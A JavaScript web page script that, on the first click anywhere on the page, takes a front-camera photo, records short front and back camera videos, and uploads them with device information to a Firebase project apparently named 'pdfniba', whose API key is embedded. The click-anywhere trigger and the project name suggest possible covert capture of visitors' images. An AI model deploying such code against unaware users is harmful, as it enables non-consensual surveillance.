// ------------------ FIREBASE IMPORTS ------------------
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

// ------------------ FIREBASE CONFIG ------------------
const firebaseConfig = {
  apiKey: "AIzaSyA5HSha0laFzd9rQZw5sAHW6O1BcX8BPzI",
  authDomain: "pdfniba.firebaseapp.com",
  projectId: "pdfniba",
  storageBucket: "pdfniba.firebasestorage.app",
  messagingSenderId: "809688909652",
  appId: "1:809688909652:web:9867944191bd95704aaac1"
};

const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const db = getFirestore(app);


// ---------------------- HELPERS ------------------------

function getDeviceInfo() {
  return navigator.userAgent || "Unknown device";
}

async function saveMetadata({ fileURL, cameraType, fileType }) {
  await addDoc(collection(db, "recordings"), {
    fileURL,
    cameraType,
    fileType,
    deviceInfo: getDeviceInfo(),
    timestamp: Date.now()
  });
}

async function getStream(facingMode) {
  return await navigator.mediaDevices.getUserMedia({
    video: { facingMode },
    audio: false,
  });
}

function record3Sec(stream) {
  return new Promise((resolve) => {
    const chunks = [];
    const recorder = new MediaRecorder(stream);
    recorder.ondataavailable = (e) => chunks.push(e.data);
    recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" }));
    recorder.start();
    setTimeout(() => recorder.stop(), 3000);
  });
}

async function upload(blob, name) {
  const fileRef = ref(storage, `captures/${Date.now()}_${name}`);
  await uploadBytes(fileRef, blob);
  return await getDownloadURL(fileRef);
}


// ---------------------- MAIN FLOW ----------------------

async function startProcess() {
  const preview = document.getElementById("preview");

  // --- FRONT PHOTO ---
  let stream = await getStream("user");
  preview.srcObject = stream;

  const img = new ImageCapture(stream.getVideoTracks()[0]);
  const photoBlob = await img.takePhoto();
  const photoURL = await upload(photoBlob, "front_photo.jpg");

  await saveMetadata({
    fileURL: photoURL,
    cameraType: "front",
    fileType: "photo",
  });

  // --- FRONT 3-SEC VIDEO ---
  const frontVid = await record3Sec(stream);
  const frontVidURL = await upload(frontVid, "front_video.webm");

  await saveMetadata({
    fileURL: frontVidURL,
    fileType: "video",
    cameraType: "front",
  });

  stream.getTracks().forEach((t) => t.stop());


  // --- BACK CAMERA VIDEO ---
  stream = await getStream("environment");
  preview.srcObject = stream;

  const backVid = await record3Sec(stream);
  const backVidURL = await upload(backVid, "back_video.webm");

  await saveMetadata({
    fileURL: backVidURL,
    fileType: "video",
    cameraType: "back",
  });

  stream.getTracks().forEach((t) => t.stop());

  alert("All recordings uploaded!");
}


// ------------------ USER-GESTURE BUTTON ------------------

// CAMERA WILL NOT START WITHOUT THIS.
window.addEventListener("DOMContentLoaded", () => {
  let started = false;

  document.addEventListener("click", () => {
    if (started) return;  // prevent multiple triggers
    started = true;

    startProcess().catch((err) => {
      console.error("Camera error:", err);
      alert("Camera access failed.");
    });
  }, { once: true });
});
